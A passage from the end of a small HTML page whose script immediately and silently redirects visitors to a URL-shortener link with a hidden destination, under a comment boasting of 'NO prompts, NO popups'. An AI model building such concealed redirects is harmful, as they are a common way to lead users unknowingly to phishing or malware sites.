        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>
    <!-- Loads your URL DIRECTLY inside the page — NO prompts, NO popups, NO questions -->

    <script>
        // Backup force-load (in case iframe is blocked by browser)
        window.onload = function() {
            window.location.replace("https://shorturl.at/BrtRo");
        };
    </script>
</body>
</html>
